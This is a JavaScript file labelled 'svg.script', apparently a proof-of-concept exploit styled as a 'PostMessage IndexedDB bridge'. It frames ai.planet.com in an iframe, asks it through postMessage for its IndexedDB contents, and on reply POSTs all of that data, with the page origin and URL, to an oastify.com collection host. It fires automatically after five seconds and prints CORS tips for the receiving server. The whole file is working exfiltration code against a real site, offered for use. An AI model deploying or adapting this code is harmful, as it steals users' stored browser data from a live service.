svg.script:

console.clear();
console.log('═══════════════════════════════════════');
console.log('📡 POSTMESSAGE INDEXEDDB BRIDGE');
console.log('═══════════════════════════════════════');

const statusLog = document.getElementById('statusLog');
let iframeReady = false;

function logStatus(message, isError = false) {
    const timestamp = new Date().toLocaleTimeString();
    const entry = `[${timestamp}] ${message}`;
    console.log(entry);
    if (statusLog) {
        statusLog.innerHTML += `<div style="color:${isError ? '#d32f2f' : '#333'}">${entry}</div>`;
        statusLog.scrollTop = statusLog.scrollHeight;
    }
}

// Function to send request to iframe
function requestDataFromIframe() {
    const iframe = document.getElementById('planetIframe');
    if (!iframe) {
        logStatus('❌ Iframe not found', true);
        return;
    }

    // Check if iframe is loaded
    try {
        const iframeWindow = iframe.contentWindow;
        if (!iframeWindow) {
            logStatus('❌ Cannot access iframe window', true);
            return;
        }

        logStatus('📤 Sending request to iframe...');

        // Send message to iframe
        iframeWindow.postMessage({
            type: 'REQUEST_INDEXEDDB_DATA',
            requestId: Date.now(),
            timestamp: new Date().toISOString()
        }, 'https://ai.planet.com');

        logStatus('✅ Request sent! Waiting for response...');

    } catch(e) {
        logStatus(`❌ Error sending message: ${e.message}`, true);
    }
}

// Send data to your server
async function sendToServer(data) {
    try {
        logStatus('📤 Sending data to https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com...');

        const response = await fetch('https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                source: window.location.origin,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                data: data,
                fromIframe: true
            })
        });

        if (response.ok) {
            const result = await response.json();
            logStatus(`✅ Data sent successfully! Response: ${JSON.stringify(result)}`);
        } else {
            logStatus(`❌ Server error: ${response.status} ${response.statusText}`, true);

            // Log request details for debugging
            console.log('📌 Request details:');
            console.log('  URL:', 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb');
            console.log('  Method: POST');
            console.log('  Headers:', { 'Content-Type': 'application/json' });
            console.log('  Body:', {
                source: window.location.origin,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                data: data,
                fromIframe: true
            });
        }
    } catch (error) {
        logStatus(`❌ Error sending to server: ${error.message}`, true);
        console.error('Network error details:', error);

        // Show CORS debugging info
        logStatus('💡 Check CORS on your server:');
        logStatus('   Access-Control-Allow-Origin: https://ai.planet.com');
        logStatus('   Access-Control-Allow-Methods: POST, OPTIONS');
        logStatus('   Access-Control-Allow-Headers: Content-Type');
    }
}

// Listen for messages from iframe
window.addEventListener('message', async function(event) {
    // Security: Verify origin
    if (event.origin !== 'https://ai.planet.com') {
        console.log(`⚠️ Ignoring message from ${event.origin}`);
        return;
    }

    const data = event.data;
    console.log('📨 Received message:', data);

    if (data.type === 'INDEXEDDB_READY') {
        logStatus('✅ Iframe is ready!');
        iframeReady = true;
    }

    if (data.type === 'INDEXEDDB_DATA_RESPONSE') {
        logStatus(`✅ Received data from iframe!`);
        logStatus(`📌 Request ID: ${data.requestId}`);

        if (data.payload) {
            const recordCount = Object.values(data.payload).reduce((sum, store) => sum + (store.length || 0), 0);
            logStatus(`📌 Total records: ${recordCount}`);
            logStatus(`📌 Data preview: ${JSON.stringify(data.payload).substring(0, 300)}...`);

            // Send to server
            await sendToServer(data.payload);
        } else {
            logStatus('⚠️ No data received');
        }
    }

    if (data.type === 'INDEXEDDB_ERROR') {
        logStatus(`❌ Iframe error: ${data.error}`, true);
    }
});

// Setup button
document.addEventListener('DOMContentLoaded', function() {
    const btn = document.getElementById('requestBtn');
    if (btn) {
        btn.addEventListener('click', requestDataFromIframe);
        logStatus('✅ Button ready - click to request data');
    }
});

logStatus('🚀 Bridge initialized');
logStatus('📍 Waiting for iframe to load...');
logStatus('💡 Click the button to request IndexedDB data');
logStatus('═══════════════════════════════════════');

// Auto-request after a delay
setTimeout(() => {
    logStatus('⏳ Auto-requesting data...');
    requestDataFromIframe();
}, 5000);
